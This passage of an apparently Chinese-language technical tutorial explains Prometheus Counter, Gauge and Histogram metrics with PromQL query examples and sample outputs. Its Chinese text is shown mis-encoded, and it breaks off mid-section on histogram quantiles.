http_requests_total{<span class="hljs-attr">method</span>=<span class="hljs-string">"GET"</span>, path=<span class="hljs-string">"/api/users"</span>, status=<span class="hljs-string">"200"</span>} <span class="hljs-number">15234</span>
http_requests_total{<span class="hljs-attr">method</span>=<span class="hljs-string">"GET"</span>, path=<span class="hljs-string">"/api/users"</span>, status=<span class="hljs-string">"404"</span>} <span class="hljs-number">42</span>
http_requests_total{<span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>, path=<span class="hljs-string">"/api/users"</span>, status=<span class="hljs-string">"200"</span>} <span class="hljs-number">8901</span>
http_requests_total{<span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>, path=<span class="hljs-string">"/api/users"</span>, status=<span class="hljs-string">"400"</span>} <span class="hljs-number">156</span>

error_log_total{<span class="hljs-attr">level</span>=<span class="hljs-string">"error"</span>, service=<span class="hljs-string">"user-service"</span>} <span class="hljs-number">234</span>
error_log_total{<span class="hljs-attr">level</span>=<span class="hljs-string">"error"</span>, service=<span class="hljs-string">"order-service"</span>} <span class="hljs-number">89</span>

db_queries_total{<span class="hljs-attr">database</span>=<span class="hljs-string">"mysql"</span>, operation=<span class="hljs-string">"select"</span>} <span class="hljs-number">89234</span>
db_queries_total{<span class="hljs-attr">database</span>=<span class="hljs-string">"mysql"</span>, operation=<span class="hljs-string">"insert"</span>} <span class="hljs-number">12456</span>
</code></pre>
<p>æ³¨æ„å‡ ä¸ªè®¾è®¡ç»†èŠ‚ï¼š</p>
<ol>
<li><strong>å‘½ååç¼€ <code>_total</code></strong>ï¼šè¿™æ˜¯çº¦å®šä¿—æˆçš„è§„èŒƒï¼Œè¡¨ç¤º"æ€»æ•°"</li>
<li><strong>æ ‡ç­¾é€‰æ‹©</strong>ï¼š<code>method</code>ã€<code>path</code>ã€<code>status</code> æ˜¯ä½åŸºæ•°çš„æ ‡ç­¾ï¼Œä¸ä¼šæ— é™å¢é•¿</li>
<li><strong>ä¸è¦ç”¨é«˜åŸºæ•°æ ‡ç­¾</strong>ï¼šæ¯”å¦‚ä¸è¦ç”¨ <code>user_id</code>ã€<code>request_id</code></li>
</ol>
<p><strong>å¸¸ç”¨å‡½æ•°</strong></p>
<p><strong>1. rate() - è®¡ç®—æ¯ç§’é€Ÿç‡</strong></p>
<pre><code class="hljs language-promql" lang="promql"># è¿‡å» 5 åˆ†é’Ÿçš„å¹³å‡æ¯ç§’è¯·æ±‚é€Ÿç‡
rate(http_requests_total[5m])

# ç»“æœç¤ºä¾‹
http_requests_total{method="GET", path="/api/users"} 150.5
â†’ è¡¨ç¤ºè¿‡å» 5 åˆ†é’Ÿï¼Œè¿™ä¸ªæ¥å£å¹³å‡æ¯ç§’å¤„ç† 150.5 ä¸ªè¯·æ±‚
</code></pre>
<p>ä¸ºä»€ä¹ˆå‡ ä¹æ€»æ˜¯ç”¨ <code>rate()</code>ï¼Ÿå› ä¸º Counter çš„åŸå§‹å€¼ï¼ˆæ¯”å¦‚ 15234ï¼‰æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œä½ å…³å¿ƒçš„æ˜¯"ç°åœ¨æ¯ç§’å¤šå°‘ä¸ªè¯·æ±‚"ã€‚</p>
<p><strong>2. increase() - è®¡ç®—æ—¶é—´çª—å£å†…çš„å¢é‡</strong></p>
<pre><code class="hljs language-promql" lang="promql"># è¿‡å» 1 å°æ—¶å¢åŠ äº†å¤šå°‘ä¸ªè¯·æ±‚
increase(http_requests_total[1h])

# ç»“æœç¤ºä¾‹
http_requests_total{method="GET"} 540000
â†’ è¿‡å» 1 å°æ—¶ï¼Œå¢åŠ äº† 54 ä¸‡ä¸ªè¯·æ±‚
</code></pre>
<p>æ³¨æ„ <code>increase()</code> å’Œ <code>rate()</code> çš„å…³ç³»ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">increase</span>(metric[<span class="hljs-number">1</span>h]) = <span class="hljs-built_in">rate</span>(metric[<span class="hljs-number">1</span>h]) Ã— <span class="hljs-number">3600</span>
</code></pre>
<p><strong>3. topk() - æ‰¾å‡ºå‰ N å</strong></p>
<pre><code class="hljs language-promql" lang="promql"># æ‰¾å‡ºè¯·æ±‚é‡æœ€å¤§çš„å‰ 10 ä¸ªæ¥å£
topk(10, rate(http_requests_total[5m]))

# æ‰¾å‡ºé”™è¯¯æœ€å¤šçš„å‰ 5 ä¸ªæœåŠ¡
topk(5, increase(error_log_total[1h]))
</code></pre>
<p><strong>å®æˆ˜æŠ€å·§</strong></p>
<p><strong>é”™è¯¯ç¤ºä¾‹ 1ï¼šç›´æ¥ç”¨ Counter çš„åŸå§‹å€¼</strong></p>
<pre><code class="hljs language-promql" lang="promql"># é”™è¯¯ï¼šç›´æ¥çœ‹ Counter çš„å€¼æ²¡ä»€ä¹ˆæ„ä¹‰
http_requests_total &gt; 10000

# æ­£ç¡®ï¼šçœ‹é€Ÿç‡æ˜¯å¦è¿‡é«˜
rate(http_requests_total[5m]) &gt; 100
</code></pre>
<p><strong>é”™è¯¯ç¤ºä¾‹ 2ï¼šæ—¶é—´çª—å£å¤ªçŸ­</strong></p>
<pre><code class="hljs language-promql" lang="promql"># é—®é¢˜ï¼š1 åˆ†é’Ÿçª—å£å¤ªçŸ­ï¼Œå®¹æ˜“å—ç¬æ—¶æ³¢åŠ¨å½±å“
rate(http_requests_total[1m])

# å»ºè®®ï¼šè‡³å°‘ç”¨ 5 åˆ†é’Ÿçª—å£
rate(http_requests_total[5m])
</code></pre>
<p><strong>é”™è¯¯ç¤ºä¾‹ 3ï¼šåœ¨é«˜åŸºæ•°æ ‡ç­¾ä¸Šä½¿ç”¨ Counter</strong></p>
<pre><code class="hljs language-promql" lang="promql"># é”™è¯¯ï¼šuser_id æœ‰ç™¾ä¸‡çº§åˆ«ï¼Œä¼šäº§ç”Ÿç™¾ä¸‡æ¡æ—¶é—´åºåˆ—
http_requests_total{user_id="123456"}

# æ­£ç¡®ï¼šåªæŒ‰æœåŠ¡å’Œæ¥å£èšåˆ
http_requests_total{service="api", path="/users"}
</code></pre>
<p><strong>Counter çš„è®¾è®¡æ™ºæ…§</strong></p>
<p>Counter çš„è®¾è®¡çœ‹ä¼¼ç®€å•ï¼ˆåªå¢ä¸å‡ï¼‰ï¼Œä½†è•´å«ç€æ·±åˆ»çš„æ™ºæ…§ï¼š</p>
<ol>
<li><strong>ä¸“æ³¨æœ¬è´¨</strong>ï¼šç›‘æ§å…³å¿ƒ"ç°åœ¨æ€ä¹ˆæ ·"ï¼ˆé€Ÿç‡ï¼‰ï¼Œä¸å…³å¿ƒ"æ€»å…±å¤šå°‘"ï¼ˆç´¯ç§¯å€¼ï¼‰</li>
<li><strong>å®¹å¿é‡ç½®</strong>ï¼šç‰ºç‰²ç»å¯¹ç²¾ç¡®ï¼Œæ¢å–ç³»ç»Ÿç®€å•å’Œå¯é </li>
<li><strong>é…åˆ rate()</strong>ï¼šè®¾è®¡äº†é…å¥—å‡½æ•°æ¥å¤„ç†é‡ç½®ï¼Œè®©ç”¨æˆ·æ— æ„ŸçŸ¥</li>
</ol>
<p>è¿™å°±æ˜¯"ç®€å•æ¨¡å‹çœ‹é€å¤æ‚ç³»ç»Ÿ"çš„ç¬¬ä¸€ä¸ªä¾‹å­ï¼šä¸€ä¸ªåªå¢ä¸å‡çš„è®¡æ•°å™¨ï¼Œé…åˆä¸€ä¸ª rate() å‡½æ•°ï¼Œå°±èƒ½æè¿°ä¸–é—´æ‰€æœ‰"äº‹ä»¶ç´¯ç§¯"çš„åœºæ™¯ã€‚</p>
<h3 data-id="heading-7">2.2 Gaugeï¼ˆä»ªè¡¨ç›˜ï¼‰</h3>
<p><strong>å®šä¹‰</strong></p>
<p>Gauge æ˜¯å¯ä»¥ä»»æ„å¢å‡çš„æŒ‡æ ‡ï¼Œåæ˜ "å½“å‰çŠ¶æ€"ã€‚</p>
<p><strong>å…¸å‹åœºæ™¯</strong></p>
<p>å›ç­”"ç°åœ¨æ˜¯å¤šå°‘"çš„é—®é¢˜ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">çœŸå®åœºæ™¯ï¼šæœåŠ¡å™¨ç›‘æ§

node_memory_MemAvailable_bytes{<span class="hljs-attr">instance</span>=<span class="hljs-string">"server-01"</span>} <span class="hljs-number">8589934592</span>
node_cpu_usage_percent{<span class="hljs-attr">instance</span>=<span class="hljs-string">"server-01"</span>, cpu=<span class="hljs-string">"0"</span>} <span class="hljs-number">45.2</span>
node_filesystem_free_bytes{<span class="hljs-attr">instance</span>=<span class="hljs-string">"server-01"</span>, mountpoint=<span class="hljs-string">"/"</span>} <span class="hljs-number">107374182400</span>

çœŸå®åœºæ™¯ï¼šåº”ç”¨ç›‘æ§

current_connections{<span class="hljs-attr">service</span>=<span class="hljs-string">"database"</span>, pool=<span class="hljs-string">"main"</span>} <span class="hljs-number">45</span>
current_connections{<span class="hljs-attr">service</span>=<span class="hljs-string">"database"</span>, pool=<span class="hljs-string">"readonly"</span>} <span class="hljs-number">12</span>
queue_length{<span class="hljs-attr">service</span>=<span class="hljs-string">"message-queue"</span>, queue=<span class="hljs-string">"orders"</span>} <span class="hljs-number">156</span>
goroutine_count{<span class="hljs-attr">service</span>=<span class="hljs-string">"api-server"</span>} <span class="hljs-number">234</span>

çœŸå®åœºæ™¯ï¼šä¸šåŠ¡ç›‘æ§

current_online_users{<span class="hljs-attr">region</span>=<span class="hljs-string">"asia"</span>} <span class="hljs-number">15234</span>
current_online_users{<span class="hljs-attr">region</span>=<span class="hljs-string">"europe"</span>} <span class="hljs-number">8901</span>
inventory_count{<span class="hljs-attr">product</span>=<span class="hljs-string">"iphone-15"</span>, warehouse=<span class="hljs-string">"shanghai"</span>} <span class="hljs-number">450</span>
</code></pre>
<p><strong>Gauge vs Counter çš„é€‰æ‹©</strong></p>
<p>è¿™æ˜¯ä¸ªå¸¸è§çš„å›°æƒ‘ã€‚æ€ä¹ˆåˆ¤æ–­ç”¨å“ªä¸ªï¼Ÿ</p>








































<table><thead><tr><th>é—®é¢˜</th><th>ç±»å‹</th><th>åŸå› </th></tr></thead><tbody><tr><td>æ€»å…±å¤„ç†äº†å¤šå°‘è¯·æ±‚ï¼Ÿ</td><td>Counter</td><td>åªå¢ä¸å‡</td></tr><tr><td>ç°åœ¨æœ‰å¤šå°‘æ´»è·ƒè¿æ¥ï¼Ÿ</td><td>Gauge</td><td>å¯å¢å¯å‡</td></tr><tr><td>æ€»å…±å‘ç”Ÿäº†å¤šå°‘é”™è¯¯ï¼Ÿ</td><td>Counter</td><td>åªå¢ä¸å‡</td></tr><tr><td>ç°åœ¨é˜Ÿåˆ—é‡Œæœ‰å¤šå°‘ä»»åŠ¡ï¼Ÿ</td><td>Gauge</td><td>å¯å¢å¯å‡</td></tr><tr><td>CPU æ—¶é—´ç´¯è®¡å¤šå°‘ç§’ï¼Ÿ</td><td>Counter</td><td>æ—¶é—´ç´¯ç§¯ï¼Œåªå¢ä¸å‡</td></tr><tr><td>CPU ä½¿ç”¨ç‡æ˜¯å¤šå°‘ï¼Ÿ</td><td>Gauge</td><td>ç™¾åˆ†æ¯”ï¼Œå¯å¢å¯å‡</td></tr></tbody></table>
<p>ç®€å•è§„åˆ™ï¼š</p>
<ul>
<li><strong>ç´¯ç§¯çš„ã€æ°¸è¿œå¢é•¿çš„</strong> â†’ Counter</li>
<li><strong>å½“å‰çš„ã€å¯ä¸Šå¯ä¸‹çš„</strong> â†’ Gauge</li>
</ul>
<p><strong>å¸¸ç”¨å‡½æ•°</strong></p>
<p><strong>1. ç›´æ¥æŸ¥è¯¢å½“å‰å€¼</strong></p>
<pre><code class="hljs language-promql" lang="promql"># çœ‹å½“å‰å†…å­˜ä½¿ç”¨
node_memory_MemAvailable_bytes

# çœ‹å½“å‰è¿æ¥æ•°
current_connections
</code></pre>
<p><strong>2. delta() - è®¡ç®—å˜åŒ–é‡</strong></p>
<pre><code class="hljs language-promql" lang="promql"># CPU æ¸©åº¦åœ¨è¿‡å» 2 å°æ—¶çš„å˜åŒ–
delta(cpu_temp_celsius{host="server-01"}[2h])

# å†…å­˜ä½¿ç”¨åœ¨è¿‡å» 1 å°æ—¶çš„å˜åŒ–
delta(node_memory_usage_bytes[1h])
</code></pre>
<p><strong>3. avg_over_time() - è®¡ç®—å¹³å‡å€¼</strong></p>
<pre><code class="hljs language-promql" lang="promql"># è¿‡å» 5 åˆ†é’Ÿçš„å¹³å‡ CPU ä½¿ç”¨ç‡
avg_over_time(node_cpu_usage_percent[5m])

# è¿‡å» 1 å°æ—¶çš„å¹³å‡é˜Ÿåˆ—é•¿åº¦
avg_over_time(queue_length[1h])
</code></pre>
<p><strong>4. predict_linear() - é¢„æµ‹æœªæ¥</strong></p>
<p>è¿™æ˜¯ä¸ªå¾ˆå¼ºå¤§çš„å‡½æ•°ï¼š</p>
<pre><code class="hljs language-promql" lang="promql"># åŸºäºè¿‡å» 1 å°æ—¶çš„æ•°æ®ï¼Œé¢„æµ‹ 4 å°æ—¶åç£ç›˜å‰©ä½™ç©ºé—´
predict_linear(node_filesystem_free_bytes[1h], 4*3600)

# å¦‚æœé¢„æµ‹å€¼ &lt; 0ï¼Œè¯´æ˜ç£ç›˜ä¼šæ»¡
predict_linear(node_filesystem_free_bytes[1h], 4*3600) &lt; 0
</code></pre>
<p>åŸç†æ˜¯ç®€å•çº¿æ€§å›å½’ï¼š</p>
<ol>
<li>çœ‹è¿‡å» 1 å°æ—¶çš„è¶‹åŠ¿</li>
<li>å‡è®¾è¶‹åŠ¿å»¶ç»­</li>
<li>æ¨ç®— 4 å°æ—¶åçš„å€¼</li>
</ol>
<p><strong>å®æˆ˜æŠ€å·§</strong></p>
<p><strong>æŠ€å·§ 1ï¼šGauge å¯ä»¥ç”¨ rate()ï¼Œä½†è¦ç†è§£å«ä¹‰</strong></p>
<pre><code class="hljs language-promql" lang="promql"># å¯¹ Gauge ç”¨ rate() æ˜¯å¯ä»¥çš„
rate(queue_length[5m])

# ä½†å«ä¹‰æ˜¯ï¼šé˜Ÿåˆ—é•¿åº¦çš„å˜åŒ–é€Ÿç‡
# å¦‚æœç»“æœæ˜¯æ­£æ•°ï¼šé˜Ÿåˆ—åœ¨å¢é•¿
# å¦‚æœç»“æœæ˜¯è´Ÿæ•°ï¼šé˜Ÿåˆ—åœ¨å‡å°‘
</code></pre>
<p><strong>æŠ€å·§ 2ï¼šå†…å­˜"å¯ç”¨"vs"ç©ºé—²"</strong></p>
<pre><code class="hljs language-promql" lang="promql"># é”™è¯¯ï¼šMemFree ä¸æ˜¯çœŸæ­£å¯ç”¨çš„å†…å­˜
node_memory_MemFree_bytes

# æ­£ç¡®ï¼šMemAvailable æ‰æ˜¯çœŸæ­£å¯ç”¨çš„
node_memory_MemAvailable_bytes

# åŸå› ï¼šLinux ä¼šç”¨ç©ºé—²å†…å­˜åš cache/buffer
# MemFree åªæ˜¯å®Œå…¨æœªä½¿ç”¨çš„
# MemAvailable = Free + å¯å›æ”¶çš„ cache
</code></pre>
<p><strong>æŠ€å·§ 3ï¼šè®¡ç®—ç™¾åˆ†æ¯”</strong></p>
<pre><code class="hljs language-promql" lang="promql"># å†…å­˜ä½¿ç”¨ç‡
(1 - node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes) * 100

# ç£ç›˜ä½¿ç”¨ç‡
(1 - node_filesystem_avail_bytes / node_filesystem_size_bytes) * 100
</code></pre>
<p><strong>Gauge çš„è®¾è®¡æ™ºæ…§</strong></p>
<p>Gauge çš„æœ¬è´¨æ˜¯"å¿«ç…§"ï¼šå®ƒè®°å½•çš„æ˜¯æŸä¸€æ—¶åˆ»çš„çŠ¶æ€ã€‚</p>
<p>è¿™ä¸ªè®¾è®¡çš„ç²¾å¦™ä¹‹å¤„åœ¨äºï¼š</p>
<ol>
<li><strong>ä¸å…³å¿ƒå†å²</strong>ï¼šåªå‘Šè¯‰ä½ "ç°åœ¨æ˜¯å¤šå°‘"ï¼Œè¿‡å»çš„äº‹æƒ…ä¸é‡è¦</li>
<li><strong>å¯å¢å¯å‡</strong>ï¼šçœŸå®åæ˜ ç³»ç»ŸçŠ¶æ€çš„å˜åŒ–</li>
<li><strong>å¤©ç„¶æ”¯æŒé¢„æµ‹</strong>ï¼šç”¨ predict_linear() å¯ä»¥åŸºäºè¶‹åŠ¿é¢„æµ‹æœªæ¥</li>
</ol>
<p>è¿™æ˜¯"ç®€å•æ¨¡å‹"çš„ç¬¬äºŒä¸ªä¾‹å­ï¼šä¸€ä¸ªå¯ä»¥ä»»æ„è®¾ç½®çš„æ•°å€¼ï¼Œå°±èƒ½æè¿°æ‰€æœ‰"å½“å‰çŠ¶æ€"çš„åœºæ™¯ã€‚æ²¡æœ‰å¤æ‚çš„çŠ¶æ€æœºï¼Œæ²¡æœ‰å†å²è¿½è¸ªï¼Œç®€å•è€Œç›´æ¥ã€‚</p>
<h3 data-id="heading-8">2.3 Histogramï¼ˆç›´æ–¹å›¾ï¼‰</h3>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ Histogram</strong></p>
<p>å…ˆçœ‹ä¸€ä¸ªé—®é¢˜ã€‚</p>
<p>å‡è®¾ä½ çš„ API å¹³å‡å“åº”æ—¶é—´æ˜¯ 100msã€‚é‚£ç³»ç»Ÿæ˜¯å¦å¥åº·ï¼Ÿ</p>
<p><strong>ä¸çŸ¥é“</strong>ã€‚å› ä¸ºå¹³å‡å€¼ä¼šæ©ç›–é—®é¢˜ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">åœºæ™¯ 1ï¼šæ‰€æœ‰è¯·æ±‚éƒ½æ˜¯ 100ms
â†’ å¹³å‡å€¼ 100msï¼Œç³»ç»Ÿå¾ˆç¨³å®š

åœºæ™¯ 2ï¼š
<span class="hljs-meta prompt_">90% </span><span class="bash">çš„è¯·æ±‚æ˜¯ 10ms</span>
<span class="hljs-meta prompt_">10% </span><span class="bash">çš„è¯·æ±‚æ˜¯ 910ms</span>
â†’ å¹³å‡å€¼è¿˜æ˜¯ 100msï¼Œä½†æœ‰ä¸¥é‡çš„é•¿å°¾é—®é¢˜ï¼
</code></pre>
<p>è¿™å°±æ˜¯è‘—åçš„"å¹³å‡å€¼è°è¨€"ã€‚ä½ éœ€è¦çŸ¥é“<strong>åˆ†å¸ƒ</strong>ï¼š</p>
<ul>
<li>æœ‰å¤šå°‘è¯·æ±‚åœ¨ 50ms å†…ï¼Ÿ</li>
<li>æœ‰å¤šå°‘è¯·æ±‚åœ¨ 100ms å†…ï¼Ÿ</li>
<li>æœ‰å¤šå°‘è¯·æ±‚åœ¨ 500ms å†…ï¼Ÿ</li>
<li>æœ‰å¤šå°‘è¯·æ±‚è¶…è¿‡ 1 ç§’ï¼Ÿ</li>
</ul>
<p>Histogram å°±æ˜¯æ¥è§£å†³è¿™ä¸ªé—®é¢˜çš„ã€‚</p>
<p><strong>Histogram çš„ç»“æ„</strong></p>
<p>ä¸€ä¸ª Histogram æŒ‡æ ‡ä¼šç”Ÿæˆå¤šæ¡æ—¶é—´åºåˆ—ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># TYPE http_request_duration_seconds histogram</span>

http_request_duration_seconds_bucket{<span class="hljs-attr">le</span>=<span class="hljs-string">"0.005"</span>} <span class="hljs-number">0</span>
http_request_duration_seconds_bucket{<span class="hljs-attr">le</span>=<span class="hljs-string">"0.01"</span>} <span class="hljs-number">0</span>
http_request_duration_seconds_bucket{<span class="hljs-attr">le</span>=<span class="hljs-string">"0.025"</span>} <span class="hljs-number">0</span>
http_request_duration_seconds_bucket{<span class="hljs-attr">le</span>=<span class="hljs-string">"0.05"</span>} <span class="hljs-number">50</span>
http_request_duration_seconds_bucket{<span class="hljs-attr">le</span>=<span class="hljs-string">"0.1"</span>} <span class="hljs-number">150</span>
http_request_duration_seconds_bucket{<span class="hljs-attr">le</span>=<span class="hljs-string">"0.25"</span>} <span class="hljs-number">180</span>
http_request_duration_seconds_bucket{<span class="hljs-attr">le</span>=<span class="hljs-string">"0.5"</span>} <span class="hljs-number">195</span>
http_request_duration_seconds_bucket{<span class="hljs-attr">le</span>=<span class="hljs-string">"1"</span>} <span class="hljs-number">198</span>
http_request_duration_seconds_bucket{<span class="hljs-attr">le</span>=<span class="hljs-string">"2.5"</span>} <span class="hljs-number">200</span>
http_request_duration_seconds_bucket{<span class="hljs-attr">le</span>=<span class="hljs-string">"5"</span>} <span class="hljs-number">200</span>
http_request_duration_seconds_bucket{<span class="hljs-attr">le</span>=<span class="hljs-string">"+Inf"</span>} <span class="hljs-number">200</span>

http_request_duration_seconds_sum 45.67
http_request_duration_seconds_count 200
</code></pre>
<p>åˆ†è§£ä¸€ä¸‹ï¼š</p>
<ol>
<li><strong>å¤šä¸ª <code>_bucket</code></strong>ï¼šæ¯ä¸ª bucket æ˜¯ä¸€ä¸ª Counterï¼Œè®°å½•"â‰¤ æŸä¸ªå€¼"çš„è¯·æ±‚æ•°</li>
<li><strong><code>_sum</code></strong>ï¼šæ‰€æœ‰è¯·æ±‚çš„è€—æ—¶æ€»å’Œï¼ˆCounterï¼‰</li>
<li><strong><code>_count</code></strong>ï¼šæ€»è¯·æ±‚æ•°ï¼ˆCounterï¼‰</li>
</ol>
<p><strong>ä¸¤ä¸ªå…³é”®ç†è§£</strong></p>
<p><strong>ç†è§£ 1ï¼šbucket æ˜¯ç´¯ç§¯çš„</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">le</span>=<span class="hljs-string">"0.05"</span> â†’ <span class="hljs-number">50</span>   è¡¨ç¤ºï¼šâ‰¤ <span class="hljs-number">0.05</span> ç§’çš„è¯·æ±‚æœ‰ <span class="hljs-number">50</span> ä¸ª
<span class="hljs-attr">le</span>=<span class="hljs-string">"0.1"</span>  â†’ <span class="hljs-number">150</span>  è¡¨ç¤ºï¼šâ‰¤ <span class="hljs-number">0.1</span> ç§’çš„è¯·æ±‚æœ‰ <span class="hljs-number">150</span> ä¸ªï¼ˆåŒ…å«å‰é¢çš„ <span class="hljs-number">50</span> ä¸ªï¼‰
<span class="hljs-attr">le</span>=<span class="hljs-string">"0.5"</span>  â†’ <span class="hljs-number">195</span>  è¡¨ç¤ºï¼šâ‰¤ <span class="hljs-number">0.5</span> ç§’çš„è¯·æ±‚æœ‰ <span class="hljs-number">195</span> ä¸ªï¼ˆåŒ…å«å‰é¢çš„ <span class="hljs-number">150</span> ä¸ªï¼‰
</code></pre>
<p>æ‰€ä»¥ï¼š</p>
<ul>
<li>0.05 ~ 0.1 ç§’ä¹‹é—´çš„è¯·æ±‚æ•° = 150 - 50 = 100 ä¸ª</li>
<li>0.1 ~ 0.5 ç§’ä¹‹é—´çš„è¯·æ±‚æ•° = 195 - 150 = 45 ä¸ª</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[&amp;#34;le=0.05 æœ‰50ä¸ª&amp;#34;] --&gt; B[&amp;#34;le=0.1 æœ‰150ä¸ª åŒ…å«å‰é¢50ä¸ª&amp;#34;]
    B --&gt; C[&amp;#34;le=0.5 æœ‰195ä¸ª åŒ…å«å‰é¢150ä¸ª&amp;#34;]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
</code></pre>
<p><strong>ç†è§£ 2ï¼šä¸å­˜åŸå§‹æ•°æ®ï¼Œå­˜åŒºé—´ç»Ÿè®¡</strong></p>
<p>Histogram ä¸ä¼šå­˜æ¯ä¸ªè¯·æ±‚çš„å‡†ç¡®è€—æ—¶ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile">ä¸æ˜¯è¿™æ ·å­˜ï¼š
<span class="hljs-section">request_1: 0.234 ç§’</span>
<span class="hljs-section">request_2: 0.156 ç§’</span>
<span class="hljs-section">request_3: 0.089 ç§’</span>
...

è€Œæ˜¯è¿™æ ·å­˜ï¼š
â‰¤ 0.05 ç§’: 50 ä¸ª
â‰¤ 0.1 ç§’: 150 ä¸ª
â‰¤ 0.5 ç§’: 195 ä¸ª
...
</code></pre>
<p><strong>ç”¨ä¸¤ä¸ªç±»æ¯”ç†è§£</strong></p>
<p><strong>ç±»æ¯” 1ï¼šå­˜çš„æ˜¯ç­‰ç¬¬ï¼Œä¸æ˜¯åˆ†æ•°</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">ä¸å­˜æ¯ä¸ªå­¦ç”Ÿçš„åˆ†æ•°ï¼š</span>
<span class="hljs-string">å­¦ç”Ÿ</span> <span class="hljs-attr">A:</span> <span class="hljs-number">95</span> <span class="hljs-string">åˆ†</span>
<span class="hljs-string">å­¦ç”Ÿ</span> <span class="hljs-attr">B:</span> <span class="hljs-number">88</span> <span class="hljs-string">åˆ†</span>
<span class="hljs-string">å­¦ç”Ÿ</span> <span class="hljs-attr">C:</span> <span class="hljs-number">76</span> <span class="hljs-string">åˆ†</span>
<span class="hljs-string">...</span> <span class="hljs-string">ï¼ˆ1000</span> <span class="hljs-string">ä¸ªå­¦ç”Ÿï¼‰</span>

<span class="hljs-string">è€Œæ˜¯å­˜åˆ†æ•°æ®µç»Ÿè®¡ï¼š</span>
<span class="hljs-string">â‰¥</span> <span class="hljs-number">90</span> <span class="hljs-string">åˆ†ï¼ˆA</span> <span class="hljs-string">ç­‰ï¼‰:</span> <span class="hljs-number">150</span> <span class="hljs-string">äºº</span>
<span class="hljs-string">â‰¥</span> <span class="hljs-number">80</span> <span class="hljs-string">åˆ†ï¼ˆB</span> <span class="hljs-string">ç­‰ï¼‰:</span> <span class="hljs-number">400</span> <span class="hljs-string">äººï¼ˆåŒ…å«</span> <span class="hljs-string">A</span> <span class="hljs-string">ç­‰ï¼‰</span>
<span class="hljs-string">â‰¥</span> <span class="hljs-number">70</span> <span class="hljs-string">åˆ†ï¼ˆC</span> <span class="hljs-string">ç­‰ï¼‰:</span> <span class="hljs-number">700</span> <span class="hljs-string">äººï¼ˆåŒ…å«</span> <span class="hljs-string">A+B</span> <span class="hljs-string">ç­‰ï¼‰</span>
<span class="hljs-string">â‰¥</span> <span class="hljs-number">60</span> <span class="hljs-string">åˆ†ï¼ˆD</span> <span class="hljs-string">ç­‰ï¼‰:</span> <span class="hljs-number">950</span> <span class="hljs-string">äºº</span>
<span class="hljs-string">æ‰€æœ‰äºº:</span> <span class="hljs-number">1000</span> <span class="hljs-string">äºº</span>
</code></pre>
<p>è¿™æ ·ï¼š</p>
<ul>
<li>å­˜å‚¨é‡ä» 1000 æ¡è®°å½• â†’ 5 æ¡è®°å½•</li>
<li>ç‰ºç‰²äº†ç²¾ç¡®åº¦ï¼ˆä¸çŸ¥é“å…·ä½“åˆ†æ•°ï¼‰</li>
<li>ä¿ç•™äº†åˆ†å¸ƒä¿¡æ¯ï¼ˆçŸ¥é“æœ‰å¤šå°‘äººåœ¨å„ä¸ªåˆ†æ•°æ®µï¼‰</li>
</ul>
<p><strong>ç±»æ¯” 2ï¼šæ•°æ®åº“çš„ GROUP BY èšåˆ</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ä¸æ˜¯å­˜æ¯æ¡è®¢å•æ˜ç»†</span>
<span class="hljs-keyword">SELECT</span> order_id, amount <span class="hljs-keyword">FROM</span> orders;  <span class="hljs-comment">-- 100 ä¸‡è¡Œ</span>

<span class="hljs-comment">-- è€Œæ˜¯å­˜é‡‘é¢åŒºé—´ç»Ÿè®¡</span>
<span class="hljs-keyword">SELECT</span> 
  <span class="hljs-keyword">CASE</span> 
    <span class="hljs-keyword">WHEN</span> amount <span class="hljs-operator">&lt;=</span> <span class="hljs-number">100</span> <span class="hljs-keyword">THEN</span> <span class="hljs-string">'0-100'</span>
    <span class="hljs-keyword">WHEN</span> amount <span class="hljs-operator">&lt;=</span> <span class="hljs-number">500</span> <span class="hljs-keyword">THEN</span> <span class="hljs-string">'100-500'</span>
    <span class="hljs-keyword">WHEN</span> amount <span class="hljs-operator">&lt;=</span> <span class="hljs-number">1000</span> <span class="hljs-keyword">THEN</span> <span class="hljs-string">'500-1000'</span>
  <span class="hljs-keyword">END</span> <span class="hljs-keyword">AS</span> <span class="hljs-keyword">range</span>,
  <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> count
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">range</span>;  <span class="hljs-comment">-- åªæœ‰å‡ è¡Œ</span>
</code></pre>
<p>Histogram å°±åƒæ˜¯æå‰åšå¥½çš„ GROUP BY èšåˆã€‚</p>
<p><strong>å¸¸ç”¨å‡½æ•°</strong></p>
<p><strong>histogram_quantile() - è®¡ç®—åˆ†ä½æ•°</strong></p>
<pre><code class="hljs language-promql" lang="promql"># è®¡ç®— P95ï¼ˆ95 åˆ†ä½æ•°ï¼‰
histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m]))

# è®¡ç®— P99
histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m]))

# è®¡ç®— P50ï¼ˆä¸­ä½æ•°ï¼‰
histogram_quantile(0.5, rate(http_request_duration_seconds_bucket[5m]))
</code></pre>
<p>åˆ†ä½æ•°çš„å«ä¹‰ï¼š</p>
<ul>
<li>P95 = 0.8 ç§’ â†’ 95% çš„è¯·æ±‚åœ¨ 0.8 ç§’å†…å®Œæˆ</li>
<li>P99 = 1.5 ç§’ â†’ 99% çš„è¯·æ±‚åœ¨ 1.5 ç§’å†…å®Œæˆ</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆå¿…é¡»é…åˆ rate()ï¼Ÿ</strong></p>
